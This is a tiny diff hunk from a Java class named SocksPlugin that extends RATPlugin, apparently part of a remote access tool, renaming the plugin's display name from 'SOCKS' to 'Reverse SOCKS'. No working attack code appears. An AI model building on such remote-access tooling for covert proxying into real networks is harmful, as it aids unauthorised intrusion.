@@ -53,7 +53,7 @@ public class SocksPlugin extends RATPlugin {
 
 	@Override
 	public String getName() {
-		return "SOCKS";
+		return "Reverse SOCKS";
 	}
 
 	@Override
